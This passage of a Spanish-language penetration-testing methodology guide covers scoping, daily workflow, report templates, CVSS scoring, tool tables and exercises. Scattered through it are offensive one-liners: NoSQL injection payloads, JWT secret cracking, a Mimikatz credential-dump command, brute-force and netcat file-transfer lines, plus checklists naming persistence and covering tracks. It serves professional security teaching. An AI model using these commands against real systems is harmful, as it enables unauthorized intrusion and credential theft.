# PwnKit (CVE-2021-4034)
# Dirty COW (CVE-2016-5195)

# Windows local exploit
# JuicyPotato / RoguePotato
# PrintNightmare (CVE-2021-34527)
# ZeroLogon (CVE-2020-1472)
# EternalBlue (MS17-010)
```

#### Application Attack Techniques
```bash
# API enumeration
ffuf -u "https://ejemplo.com/api/FUZZ" -w api_endpoints.txt
ffuf -u "https://ejemplo.com/api/v1/FUZZ" -w api_endpoints.txt

# GraphQL introspection
curl "https://ejemplo.com/[graphql](../raw/4p1-s3cur1ty.md#graphql)" -H "Content-Type: application/json" -d '{"query":"{__schema{types{name fields{name}}}}"}'

# JWT attacks
python3 jwt_tool.py <token> -T
python3 jwt_tool.py <token> -C -d wordlist.txt  # Crack secret

# NoSQL injection
# MongoDB: ?username[$gt]=&password[$gt]=
# ?username[$ne]=null&password[$ne]=null
# {"username": {"$gt": ""}, "password": {"$gt": ""}}
```

### 12.4. Reporting Phase — NIST Format

#### Security Assessment Report (SAR) Template
```markdown
# Security Assessment Report
## [Organization Name]
## [Assessment Period]

### 1. Executive Summary
Brief overview of findings for management.

### 2. Assessment Overview
2.1 Background
2.2 Scope and Methodology
2.3 System Description

### 3. Findings
3.1 Critical Findings
3.2 High Findings
3.3 Medium Findings
3.4 Low Findings
3.5 Informational

### 4. Risk Assessment
4.1 Risk Scoring Methodology
4.2 Risk Matrix
4.3 Overall Risk Level

### 5. Recommendations
5.1 Immediate Actions
5.2 Short-term Recommendations
5.3 Long-term Recommendations

### 6. Conclusions

### Appendix A: Detailed Scan Results
### Appendix B: Tool Output
### Appendix C: Evidence (Screenshots)
### Appendix D: Glossary
```

---

## 13. Ciclo Completo de Pentest — Detalle

### 13.1. Pre-engagement Steps

#### Initial Contact Form
```markdown
# Pentest Request Form
## Datos del Cliente
- Empresa:
- Industria:
- Contacto principal:
- Email:
- Telefono:

## Datos del Proyecto
- Tipo de pentest: Network / Web / Mobile / [[cloud](../raw/cl0ud-h4ck1ng.md) / Wireless / Physical]
- Alcance: [Internal / External / Full Scope]
- Nivel de conocimiento: [Black / Grey / White Box]
- Numero de [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips)/URLs:
- Periodo deseado:
- Presupuesto estimado:

## Requisitos
- Certificaciones requeridas: [OSCP, CISSP, etc]
- Compliance: PCI-DSS, HIPAA, [[iso 27001](../raw/l3g4l-c0mpl14nc3.md#iso-27001), SOC2]
- Formato de reporte: [PDF, DOCX, HTML]

## Exclusiones
- Sistemas criticos:
- Horarios restringidos:
- Pruebas prohibidas:
- Datos sensibles:
```

#### Scoping Checklist Detallada
```markdown
## Scope Definition Checklist

### Network
- [ ] [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) ranges (interno/externo)
- [ ] Subnets a testear
- [ ] Dispositivos de [red](../raw/r3d3s-f0nd4m3nt0s.md) (firewalls, routers, switches)
- [ ] VPNs y conexiones remotas
- [ ] [cloud](../raw/cl0ud-h4ck1ng.md) assets ([aws](../raw/cl0ud-h4ck1ng.md#aws), [azure](../raw/cl0ud-h4ck1ng.md#azure), [gcp](../raw/cl0ud-h4ck1ng.md#gcp))

### Web Applications
- [ ] URLs completas (incluyendo subdominios)
- [ ] APIs (REST, [graphql](../raw/4p1-s3cur1ty.md#graphql), SOAP)
- [ ] Single Page Applications (SPA)
- [ ] Microservicios
- [ ] WebSockets
- [ ] [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) ([sso](../raw/hybr1d-1d3nt1ty.md#sso), [saml](../raw/hybr1d-1d3nt1ty.md#saml), [oauth](../raw/hybr1d-1d3nt1ty.md#oauth), [jwt](../raw/4p1-s3cur1ty.md#jwt))

### Mobile
- [ ] [android](../raw/4db-d33p-d1v3.md) ([apk](../raw/4pk-r3v3rs1ng.md)) / [ios](../raw/10s-p3nt3st1ng.md) (IPA)
- [ ] Versiones a testear
- [ ] API backend URLs

### Cloud
- [ ] Cuentas de cloud (AWS, Azure, GCP)
- [ ] Servicios a testear
- [ ] [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) IAM a revisar

### Wireless
- [ ] SSIDs
- [ ] Frecuencias (2.4GHz, 5GHz, 6GHz)
- [ ] Bluetooth / BLE
- [ ] [rfid](../raw/ph7s1c4l-r3d.md#rfid) / NFC

### Physical
- [ ] Oficinas / sucursales
- [ ] Data centers / server rooms
- [ ] CCTV / alarmas
- [ ] Control de acceso

### Credenciales
- [ ] Usuario estandar (para grey box)
- [ ] Usuario administrador
- [ ] Acceso [vpn](../raw/4n0n1m4t0.md#vpn)
- [ ] Acceso [fisico](../raw/ph7s1c4l-r3d.md)
```

### 13.2. Testing Phase — Daily Workflow

#### Day 1: Reconnaissance
```markdown
Manana (9:00 - 12:00):
- Passive [osint](../raw/0s1nt.md)
- [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) enumeration
- Subdomain discovery
- Technology fingerprinting

Tarde (13:00 - 18:00):
- Active port scanning
- Service enumeration
- Initial vulnerability scanning
- Directory enumeration
```

#### Day 2: Vulnerability Analysis
```markdown
Manana (9:00 - 12:00):
- Review scan results
- False positive verification
- Manual testing on key services
- Web application mapping

Tarde (13:00 - 18:00):
- Deep web app testing
- API testing
- Authentication/authorization tests
- Session management tests
```

#### Day 3-4: Exploitation
```markdown
Manana (9:00 - 12:00):
- Prioritize vulnerabilities
- Develop/configure exploits
- Execute controlled exploitation
- Document evidence

Tarde (13:00 - 18:00):
- [privilege escalation](../raw/l1n9x-pr1v3sc.md)
- Lateral movement
- Data exfiltration simulation
- Additional findings
```

#### Day 5: Post-Exploitation & Analysis
```markdown
Manana (9:00 - 12:00):
- Persistence (if agreed)
- Cover tracks (if agreed)
- Additional [pivoting](../raw/l1n9x-pr1v3sc.md#pivoting)

Tarde (13:00 - 18:00):
- Correlate findings
- CVSS scoring
- Draft findings report
- Prepare presentation
```

### 13.3. Post-Engagement

#### Client Debrief
- Reunion post-test (virtual o presencial)
- Presentar hallazgos principales
- Discutir criticos y altos
- Responder preguntas tecnicas
- Acordar timeline de remediacion
- Programar re-test

#### Evidence Archival
- Encriptar todas las evidencias
- Almacenar en lugar seguro
- Backup en ubicacion secundaria
- Destruir despues del periodo acordado (generalmente 12 meses)

#### Lessons Learned
- Que salio bien?
- Que se podria mejorar?
- Problemas de alcance?
- Herramientas nuevas a incorporar?
- Tiempo estimado vs real?

---

## 14. Tipos de Pentest — Detalle

### 14.1. Por Proposito

#### Compliance-Driven Pentest
- Objetivo: Cumplir con regulacion
- Estandares: PCI-DSS, HIPAA, SOC2, ISO 27001
- Alcance: Definido por la regulacion
- Periodicidad: Anual o semestral

#### Security Assessment
- Objetivo: Evaluar postura de seguridad
- Sin marco regulatorio especifico
- Alcance: Definido por el cliente
- Periodicidad: Generalmente anual

#### Red Team Assessment
- Objetivo: Evaluar capacidades de deteccion y respuesta
- Sin previo aviso al equipo de seguridad (o aviso limitado)
- Alcance: Amplio, incluyendo ingenieria social
- Duracion: Semanas a meses
- Equipo: Multiples operadores

#### Purple Team Assessment
- Objetivo: Evaluar deteccion y respuesta
- Colaboracion entre Red Team y Blue Team
- Feedback inmediato
- Mejora continua

### 14.2. Por Metodologia

#### Automated Pentest
- Uso de herramientas automaticas
- Mas rapido pero menos profundo
- Ideal para compliance basico
- Herramientas: Nessus, Qualys, AppScan

#### Manual Pentest
- Pruebas realizadas por pentesters
- Mas profundo y preciso
- Detecta logic flaws
- Recomendado para aplicaciones criticas

#### Hybrid Pentest
- Combinacion de automatico + manual
- Lo mas comun en la industria
- Automatico para cobertura, manual para profundidad

### 14.3. Por Cobertura

#### Full Pentest
- Todos los sistemas en alcance
- Todas las tecnicas permitidas
- Reporte completo
- Mayor costo

#### Light Pentest
- Sistemas seleccionados
- Tecnicas limitadas
- Reporte simplificado
- Menor costo

#### Focused Pentest
- Enfoque en un area especifica
- Ej: solo web, solo API, solo AD
- Profundidad maxima en el area
- Costo medio

---

## 15. Reporting — Detalle

### 15.1. Executive Summary — Ejemplo Real

```markdown
# INFORME DE PRUEBAS DE PENETRACION
## TechCorp SA - Junio 2025

### Resumen Ejecutivo

Se realizaron pruebas de penetracion externas e internas contra los sistemas de TechCorp SA durante el periodo del 1 al 15 de Junio de 2025. El alcance incluyo 250 [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips), 3 aplicaciones web, API REST, y evaluacion de [active directory](../raw/w1nd0ws-d0m41n-4dm1n.md).

Se identificaron un total de 27 vulnerabilidades:
- 3 Criticas
- 7 Altas
- 10 Medias
- 5 Bajas
- 2 Informativas

### Riesgo General: ALTO

Los hallazgos mas significativos incluyen:
1. [sql injection](../raw/w3b-h4ck1ng.md#sql-injection) en API de clientes (Critico): Permite acceso completo a base de datos con informacion de 200,000 clientes.
2. [rce](../raw/w3b-h4ck1ng.md#rce) en servidor web [legacy](../raw/l3g4cy-3nt3rpr1s3.md) (Critico): Ejecucion remota de comandos en servidor de produccion.
3. Active Directory compromise (Alto): Configuracion insegura permite [kerberoasting](../raw/w1nd0ws-d0m41n-4dm1n.md#kerberoasting) y escalada a Domain Admin.

### Tendencias

Respecto al pentest anterior (Diciembre 2024):
- Vulnerabilidades totales: 35 -> 27 (23% de mejora)
- Criticas: 5 -> 3 (40% de mejora)
- Tiempo medio de remediacion: 45 -> 30 dias (33% de mejora)

### Resumen de Hallazgos

| Severidad | Cantidad | % del Total |
|-----------|----------|-------------|
| Critico   | 3        | 11%         |
| Alto      | 7        | 26%         |
| Medio     | 10       | 37%         |
| Bajo      | 5        | 19%         |
| Info      | 2        | 7%          |
| **Total** | **27**   | **100%**    |

### Recomendaciones Principales
1. Implementar WAF y parameterized queries para prevenir [sqli](../raw/w3b-h4ck1ng.md#sql-injection)
2. Migrar servidores legacy a versiones soportadas
3. Revisar configuracion de [ad](../raw/w1nd0ws-d0m41n-4dm1n.md) (Kerberos, ACLs, Group Policies)
4. Implementar MFA en todos los accesos remotos
5. Establecer programa de parches con revision mensual
```

### 15.2. Technical Finding — Ejemplo Real

```markdown
## VULN-004: Missing [http](../raw/r3d3s-f0nd4m3nt0s.md#http) Security Headers

**Severidad**: Medio (5.3)
**CVSS Vector**: AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
**CWE**: CWE-693 (Improper Check for Unusual or Exceptional Conditions)

### Descripcion
La aplicacion web no implementa varios headers de seguridad HTTP que protegen contra ataques comunes como clickjacking, MIME-type sniffing, y [xss](../raw/w3b-h4ck1ng.md#xss).

### Impacto
- La aplicacion es vulnerable a clickjacking (falta X-Frame-Options)
- Los navegadores pueden interpretar archivos incorrectamente (falta X-Content-Type-Options)
- No hay proteccion contra XSS via CSP
- HSTS no configurado permite [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)) stripping

### Evidencia
Headers actuales de la respuesta:
```
HTTP/1.1 200 OK
Server: nginx/1.18.0
Content-Type: text/html
...
```

### Remediation
Agregar los siguientes headers a la configuracion del servidor web:

```apache
# Para Apache (.htaccess o httpd.conf)
Header always set X-Frame-Options "DENY"
Header always set X-Content-Type-Options "nosniff"
Header always set X-XSS-Protection "1; mode=block"
Header always set Referrer-Policy "strict-origin-when-cross-origin"
Header always set Content-Security-Policy "default-src 'self'"
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"
```

```nginx
# Para Nginx
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Content-Security-Policy "default-src 'self'" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
```

### Referencias
- [owasp](../raw/w3b-h4ck1ng.md#owasp-top-10) Secure Headers: [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://[owasp](../raw/w3b-h4ck1ng.md#owasp-top-10).org/www-project-secure-headers/
- Mozilla Observatory: https://observatory.mozilla.org/
```

---

## 16. Plantillas y Deliverables — Detalle

### 16.1. Plantilla de Pentest Report Completo

```markdown
# INFORME DE PRUEBAS DE PENETRACION
## [Nombre del Cliente]
## Periodo: [Fecha Inicio] - [Fecha Fin]
## Clasificacion: CONFIDENCIAL

---

### Tabla de Contenidos
1. Resumen Ejecutivo
2. Alcance y Metodologia
3. Resumen de Hallazgos
4. Hallazgos Detallados
5. Remediation Roadmap
6. Apendices

---

### 1. Resumen Ejecutivo
[1-2 paginas]

### 2. Alcance y Metodologia

#### 2.1. Alcance
- External [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips): [lista]
- Internal IPs: [lista]
- Web Applications: [URLs]
- APIs: [endpoints]
- Mobile Apps: [[ios](../raw/10s-p3nt3st1ng.md)/[android](../raw/4db-d33p-d1v3.md)]
- [cloud](../raw/cl0ud-h4ck1ng.md): [[aws](../raw/cl0ud-h4ck1ng.md#aws)/[azure](../raw/cl0ud-h4ck1ng.md#azure)/[gcp](../raw/cl0ud-h4ck1ng.md#gcp)]

#### 2.2. Metodologia
- Framework: [ptes](../raw/p3nt3st-m3th0d0l0gy.md#ptes) / [owasp](../raw/w3b-h4ck1ng.md#owasp-top-10) / [nist](../raw/p3nt3st-m3th0d0l0gy.md#nist)
- Tipo: Black/Grey/White Box
- CVSS: 3.1

#### 2.3. Exclusiones
- [Lista de sistemas/horarios fuera de alcance]

#### 2.4. Timeline
- [reconocimiento](../raw/0s1nt.md#reconocimiento): [Fecha]
- Explotacion: [Fecha]
- Reporte: [Fecha]

### 3. Resumen de Hallazgos

#### 3.1. Por Severidad
| Severidad | Cantidad |
|-----------|----------|
| Critical  | X        |
| High      | X        |
| Medium    | X        |
| Low       | X        |
| Info      | X        |

#### 3.2. Por Categoria
| Categoria | Cantidad |
|-----------|----------|
| [sql injection](../raw/w3b-h4ck1ng.md#sql-injection) | X |
| [xss](../raw/w3b-h4ck1ng.md#xss) | X |
| Authentication | X |
| Authorization | X |
| Configuration | X |
| [cryptography](../raw/crypt0-f0r-h4ck3rs.md) | X |
| Business Logic | X |

### 4. Hallazgos Detallados

[VULN-001 a VULN-XXX]

### 5. Remediation Roadmap

#### Fase 1: Inmediata (0-7 dias)
- [ ] Criticas y altas prioritarias

#### Fase 2: Corto Plazo (7-30 dias)
- [ ] Medias y bajas

#### Fase 3: Medio Plazo (30-90 dias)
- [ ] Recomendaciones estrategicas

### 6. Apendices

#### A: Output de Herramientas
#### B: Logs de Pruebas
#### C: Screenshots
#### D: Glosario de Terminos
```

### 16.2. Plantilla de Presentacion

```markdown
# Slide 1: Portada
- Titulo: Resultados de Pentest
- Cliente: [Nombre]
- Fecha: [Fecha]
- Pentest Company: [Nombre]

# Slide 2: Agenda
1. Overview del Proyecto
2. Hallazgos Principales
3. Hallazgos Criticos y Altos
4. Roadmap de Remediation
5. Q&A

# Slide 3: Overview del Proyecto
- Alcance: [X IPs, X URLs, X apps]
- Duracion: [X dias]
- Metodologia: [Framework]
- Total hallazgos: [X]
- Criticos: [X]
- Altos: [X]
- Medios: [X]
- Bajos: [X]

# Slide 4: Hallazgos Principales
1. SQL Injection en API (Critico)
2. [rce](../raw/w3b-h4ck1ng.md#rce) en Servidor Web (Critico)
3. [ad](../raw/w1nd0ws-d0m41n-4dm1n.md) Compromise (Alto)
4. Missing Security Headers (Medio)

# Slide 5: Hallazgo Critico 1
- [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades): SQL Injection
- Impacto: Acceso a DB completa
- Risk Score: 9.8 (Critico)
- Remediation: Parameterized queries + WAF

# Slide 6: Hallazgo Critico 2
- Vulnerabilidad: RCE
- Impacto: Compromiso total del servidor
- Risk Score: 9.8 (Critico)
- Remediation: Aplicar parche + hardening

# Slide 7: Roadmap de Remediation
| Timeline | Acciones |
|----------|----------|
| 0-7 dias | Corregir criticos |
| 7-30 dias | Corregir altos |
| 30-90 dias | Corregir medios |
| 90+ dias | Recomendaciones estrategicas |

# Slide 8: Q&A
- Gracias
- Contacto: [email]
```

### 16.3. Checklist de Entrega

- [ ] Reporte tecnico en PDF firmado digitalmente
- [ ] Reporte ejecutivo en PDF
- [ ] Presentacion en PPT/PDF
- [ ] Raw data de herramientas (opcional)
- [ ] CVSS calculator file (opcional)
- [ ] Inventario de evidencias
- [ ] Factura
- [ ] Encuesta de satisfaccion
- [ ] NDA devuelto
- [ ] Certificado de destruccion (si aplica)

---

## 17. CVSS 3.x — Calculadora y Ejemplos

### 17.1. Calculadora Python

`````python
# pip install cvss
from cvss import CVSS3

def calculate_vector(vector):
    try:
        cvss = CVSS3(vector)
        return {
            "vector": vector,
            "base_score": cvss.base_score,
            "severity": cvss.severities()[0],
            "temporal_score": cvss.temporal_score,
            "environmental_score": cvss.environmental_score
        }
    except Exception as e:
        return {"error": str(e)}

# Ejemplos de vectores comunes
vectores = [
    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",  # RCE (9.8)
    "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",  # XSS (6.1)
    "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",  # Auth RCE (8.8)
    "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",  # LPE (7.8)
    "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",  # DoS (5.9)
    "CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",  # Physical (6.6)
]

for v in vectores:
    result = calculate_vector(v)
    print("%s -> Score: %s, Severity: %s" % (
        result.get("vector", "error")[:30],
        result.get("base_score", "N/A"),
        result.get("severity", "N/A")
    ))
```

### 17.2. Matriz de Riesgo

| Impacto / Probabilidad | Muy Baja | Baja | Media | Alta | Muy Alta |
|------------------------|----------|------|-------|------|----------|
| **Muy Alto** | Medio | Alto | Alto | Critico | Critico |
| **Alto** | Medio | Medio | Alto | Alto | Critico |
| **Medio** | Bajo | Medio | Medio | Alto | Alto |
| **Bajo** | Bajo | Bajo | Medio | Medio | Alto |
| **Muy Bajo** | Info | Bajo | Bajo | Medio | Medio |

---

## 18. Herramientas por Fase — Detalle

### 18.1. Reconnaissance Tools

#### Passive Tools
| Herramienta | Funcion | Comando Ejemplo |
|-------------|---------|-----------------|
| theHarvester | Email/domain OSINT | theHarvester -d dominio.com -b all |
| Maltego | Graph-based OSINT | maltego |
| Shodan | Device search | shodan search org:Ejemplo |
| Censys | Attack surface | censys search dominio.com |
| Recon-ng | Web recon framework | recon-ng |
| Spiderfoot | OSINT automation | spiderfoot -s dominio.com |
| Amass | Subdomain enum | amass enum -d dominio.com |
| Sublist3r | Subdomain enum | sublist3r -d dominio.com |

#### Active Scanning Tools
| Herramienta | Funcion | Comando Ejemplo |
|-------------|---------|-----------------|
| Nmap | Port scanning | nmap -sS -sV -O -p- -T4 target |
| Masscan | Massive scanning | masscan -p1-65535 --rate=1000 target |
| Rustscan | Fast scanning | rustscan -a target -- -A |
| Unicornscan | TCP scanning | unicornscan -mT target |
| Zmap | Internet scanning | zmap -p 443 target/subnet |

### 18.2. Vulnerability Analysis Tools

| Herramienta | Funcion | Comando Ejemplo |
|-------------|---------|-----------------|
| Nessus | Vuln scanner | nessuscli scan --target target |
| OpenVAS | Vuln scanner | greenbone-cli --scan --target target |
| Nikto | Web scanner | nikto -h https://target |
| Wapiti | Web scanner | wapiti -u https://target |
| Nuclei | Template scanner | nuclei -u https://target |
| WPScan | WordPress scanner | wpscan --url https://target |
| JoomScan | Joomla scanner | joomscan -u https://target |
| Droopescan | CMS scanner | droopescan scan drupal -u https://target |

### 18.3. Exploitation Tools

| Herramienta | Funcion | Comando Ejemplo |
|-------------|---------|-----------------|
| Metasploit | Exploit framework | msfconsole |
| Searchsploit | Exploit search | searchsploit apache 2.4 |
| Impacket | Windows protocols | impacket-psexec user@target |
| CrackMapExec | AD exploitation | crackmapexec smb target |
| SQLMap | SQL injection | sqlmap -u target?id=1 |
| BeEF | Browser exploitation | beef-xss |
| Responder | Poisoning | responder -I eth0 |
| Evilginx2 | Phishing proxy | evilginx2 |
| Bettercap | MITM framework | bettercap -eval "..."

### 18.4. Post-Exploitation Tools

| Herramienta | Funcion | Comando Ejemplo |
|-------------|---------|-----------------|
| Mimikatz | Credential dump | mimikatz.exe "sekurlsa::logonpasswords" |
| BloodHound | AD mapper | bloodhound-python -u user -p pass -d dom |
| SharpHound | AD collector | SharpHound.exe -c All |
| LinPEAS | Linux priv esc | ./linpeas.sh |
| WinPEAS | Windows priv esc | winpeas.exe |
| PowerView | AD enumeration | powershell -exec bypass -c "..." |
| Chisel | Tunneling | chisel server -p 8000 --reverse |
| Ligolo-ng | Tunneling | ligolo-ng -self |
| Socat | Port forwarding | socat TCP-LISTEN:80,fork TCP:target:80 |
| Netcat | Swiss army knife | nc -lvnp 4444 |
| Python | Reverse shell | python3 -c "..." |

### 18.5. Password Cracking Tools

| Herramienta | Funcion | Comando Ejemplo |
|-------------|---------|-----------------|
| Hashcat | GPU cracking | hashcat -m 1000 hash.txt rockyou.txt |
| John | CPU cracking | john --wordlist=rockyou.txt hash.txt |
| Hydra | Online brute force | hydra -l admin -P pass.txt target ssh |
| Medusa | Parallel brute force | medusa -h target -U users.txt -P pass.txt -M ssh |
| Crowbar | SSH/VNC brute force | crowbar -b ssh -s target/32 -u user -C pass.txt |
| CeWL | Wordlist generator | cewl https://target -w wordlist.txt |
| Crunch | Wordlist generator | crunch 8 8 abc123 -o wordlist.txt |
| HCStats | Hashcat stats | hcstats --performance |
| Hash-identifier | Hash type ID | hash-identifier hash.txt |
| Name-That-Hash | Hash type ID | nth --file hash.txt |

---

## 19. Ejercicios Practicos — Detalle

### Ejercicio 1: Scope de Pentest Externo
Una empresa te contrata para un pentest externo. Tienen 5 IPs publicas, 2 aplicaciones web, y una API. Redacta:
- SOW completo
- ROE detallado
- Checklist de pre-engagement

### Ejercicio 2: OSINT Report
Realiza OSINT de un dominio y genera:
- Lista de subdominios
- Emails encontrados
- Tecnologias detectadas
- Servidores y IPs
- Vulnerabilidades potenciales

### Ejercicio 3: Vulnerability Analysis
Dado un escaneo de nmap con estos puertos abiertos: 22 (SSH), 80 (HTTP), 443 (HTTPS), 3306 (MySQL), 8080 (HTTP-Alt):
- Que vulnerabilidades investigarias?
- Que comandos usarias?
- Que prioridad le darias a cada una?

### Ejercicio 4: Exploitation Plan
Para una SQL injection en el login de una aplicacion:
- Describe el plan de explotacion paso a paso
- Que herramientas usarias?
- Que informacion extraerian?
- Como documentarian la evidencia?

### Ejercicio 5: Post-Exploitation
Lograste obtener una shell en un servidor Linux como www-data:
- Que comandos ejecutarias primero?
- Como escalarias privilegios?
- Que buscarias en el sistema?
- Como establecerias persistencia?

### Ejercicio 6: AD Attack Chain
Describe la cadena de ataque completa para comprometer un dominio Active Directory desde una posición de usuario normal.

### Ejercicio 7: Reporte Completo
Dados 5 hallazgos (SQLi, XSS, LFI, Weak SSL, Missing Headers), redacta el reporte completo con executive summary, hallazgos detallados, remediation roadmap, y apendices.

### Ejercicio 8: CVSS Scoring
Calcula CVSS 3.1 para:
- SQL injection en API sin autenticacion
- XSS reflejado con interaccion del usuario
- LFI con privilegios bajos
- RCE con autenticacion
- DoS desde red local

### Ejercicio 9: Comparacion de Metodologias
Para un pentest de aplicacion web, que fases de PTES, OWASP, y NIST aplicarian? Cuales son las diferencias en el enfoque de cada uno?

### Ejercicio 10: Client Meeting Simulation
Prepara la agenda y los materiales para una reunion de cierre con el CISO de un cliente. Incluye:
- Presentacion ejecutiva (5 slides)
- Demo de hallazgos criticos
- Remediation roadmap
- Preguntas frecuentes

---

## 20. Recursos Adicionales

### Certificaciones por Nivel

#### Entry Level
- CompTIA Security+
- CEH (EC-Council)
- eJPT (eLearnSecurity)

#### Intermediate
- OSCP (Offensive Security)
- PNPT (TCM Security)
- GPEN (SANS)

#### Advanced
- OSEE (Offensive Security)
- GXPN (SANS)
- OSCE3 (Offensive Security)

#### Specialized
- OSWE (Web)
- OSED (Exploit Dev)
- OSWP (Wireless)
- GCIH (Incident Response)

### Libros Recomendados

- The Hacker Playbook 3 (Peter Kim)
- Penetration Testing: A Hands-On Introduction (Georgia Weidman)
- Red Team Field Manual (Ben Clark)
- Blue Team Handbook (Don Murdoch)
- The Web Application Hacker's Handbook (Stuttard & Pinto)
- Advanced Penetration Testing (Wil Allsopp)
- Hacking: The Art of Exploitation (Jon Erickson)
- Practical Malware Analysis (Sikorski & Honig)

### Laboratorios Online

| Plataforma | URL | Descripcion |
|------------|-----|-------------|
| Hack The Box | hackthebox.com | Maquinas, challenges, Fortress |
| TryHackMe | tryhackme.com | Rooms guiadas, learning paths |
| PentesterLab | pentesterlab.com | Web challenges |
| VulnHub | vulnhub.com | Maquinas descargables |
| Proving Grounds | offensive-security.com | Practica OSCP |
| Root-Me | root-me.org | Challenges variados |
| PicoCTF | picoctf.com | CTF educativo |
| CTFd | ctf.cert.org | CTF challenges |
| HackerOne CTF | hackerone.com | Bug bounty CTF |
| SANS Cyber Ranges | sans.org | Simulaciones |

### Comunidades y Foros

- Reddit: r/netsec, r/AskNetsec, r/cybersecurity
- Discord: InfoSec Community, The Cyber Mentor
- Twitter: #infosec, #pentesting, #cybersecurity
- LinkedIn: Grupos de ciberseguridad
- YouTube: IppSec, John Hammond, The Cyber Mentor, NetworkChuck
- Blogs: PortSwigger, SANS ISC, Krebs on Security

---

## 21. Checklists por Fase (Resumen Rapido)

### Pre-Engagement Checklist
- [ ] NDA firmado
- [ ] SOW firmado
- [ ] ROE definido y aceptado
- [ ] Alcance documentado
- [ ] Credenciales provistas
- [ ] Contactos de emergencia
- [ ] Horarios acordados
- [ ] Exclusiones documentadas

### Reconnaissance Checklist
- [ ] WHOIS lookup
- [ ] DNS enumeration (A, AAAA, MX, NS, TXT, SOA)
- [ ] Subdomain brute force
- [ ] Google dorks
- [ ] Shodan/Censys search
- [ ] Social media OSINT
- [ ] Technology fingerprinting
- [ ] Port scanning (TCP/UDP full range)
- [ ] Service version enumeration
- [ ] OS fingerprinting
- [ ] Banner grabbing
- [ ] Directory enumeration
- [ ] SSL/TLS analysis

### Vulnerability Analysis Checklist
- [ ] Automated vuln scan (Nessus/OpenVAS)
- [ ] NSE vulnerability scripts
- [ ] Web vulnerability scan (Nikto/Wapiti)
- [ ] Manual web testing per OWASP
- [ ] API testing
- [ ] Authentication testing
- [ ] Authorization testing
- [ ] Session management testing
- [ ] Input validation testing
- [ ] Business logic testing
- [ ] Cryptography testing
- [ ] Client-side testing

### Exploitation Checklist
- [ ] Prioritize vulnerabilities
- [ ] Research existing exploits
- [ ] Setup listener/reverse shell handler
- [ ] Execute controlled exploitation
- [ ] Document PoC with screenshots
- [ ] Validate impact
- [ ] Rollback any changes
- [ ] Password cracking attempts

### Post-Exploitation Checklist
- [ ] System information gathering
- [ ] User/group enumeration
- [ ] Network reconnaissance
- [ ] Credential hunting
- [ ] Privilege escalation attempts
- [ ] Lateral movement attempts
- [ ] Persistence establishment
- [ ] Data exfiltration simulation
- [ ] Cover tracks

### Reporting Checklist
- [ ] Executive summary written
- [ ] All findings documented with PoC
- [ ] CVSS scores calculated
- [ ] Screenshots included
- [ ] Remediation steps for each finding
- [ ] Remediation roadmap created
- [ ] Professional formatting
- [ ] Confidentiality markings
- [ ] Reviewed by peer
- [ ] Delivered in agreed format

---

## 22. Glosario de Terminos

| Termino | Definicion |
|---------|------------|
| 0-day | Vulnerabilidad sin parche conocido |
| ACL | Access Control List |
| AD | Active Directory |
| APT | Advanced Persistent Threat |
| ASLR | Address Space Layout Randomization |
| C2 | Command and Control |
| CVE | Common Vulnerabilities and Exposures |
| CWE | Common Weakness Enumeration |
| CVSS | Common Vulnerability Scoring System |
| DA | Domain Admin |
| DC | Domain Controller |
| DEP | Data Execution Prevention |
| DMZ | Demilitarized Zone |
| DNS | Domain Name System |
| DoS | Denial of Service |
| EDR | Endpoint Detection and Response |
| GPO | Group Policy Object |
| IAM | Identity and Access Management |
| IDS | Intrusion Detection System |
| IPS | Intrusion Prevention System |
| JWT | JSON Web Token |
| LPE | Local Privilege Escalation |
| MFA | Multi-Factor Authentication |
| NDA | Non-Disclosure Agreement |
| NIST | National Institute of Standards and Technology |
| OSINT | Open Source Intelligence |
| OWASP | Open Web Application Security Project |
| PII | Personally Identifiable Information |
| PoC | Proof of Concept |
| PTES | Penetration Testing Execution Standard |
| RCE | Remote Code Execution |
| RDP | Remote Desktop Protocol |
| ROE | Rules of Engagement |
| SMB | Server Message Block |
| SOC | Security Operations Center |
| SOW | Statement of Work |
| SQLi | SQL Injection |
| SSRF | Server-Side Request Forgery |
| SSTI | Server-Side Template Injection |
| TTP | Tactics, Techniques, and Procedures |
| VLAN | Virtual Local Area Network |
| VPN | Virtual Private Network |
| WAF | Web Application Firewall |
| XSS | Cross-Site Scripting |
| XXE | XML External Entity |

---

## 23. Referencias Rapidas

### Nmap Quick Reference
```bash
# Basic scan
[nmap](../raw/nm4p.md) -sS -sV -O target
nmap -sT -sV target
nmap -sU --top-ports 100 target

# Full scan
nmap -p- -sS -sV -O -A -T4 target -oA full_scan

# Scripts
nmap --script vuln target
nmap --script default,discovery target
nmap --script [http](../raw/r3d3s-f0nd4m3nt0s.md#http)-* -p80,443 target

# Output formats
nmap target -oN normal.txt
nmap target -oX scan.xml
```

### Netcat Quick Reference
```bash
# Listen
[nc](../raw/r3v3rs3-sh3lls.md#netcat) -lvnp 4444

# Connect
nc target 4444

# File transfer
nc -lvnp 4444 > received_file.txt
nc target 4444 < file_to_send.txt

# Port scan
nc -zv target 1-1000
```

### Metasploit Quick Reference
```bash
# Search
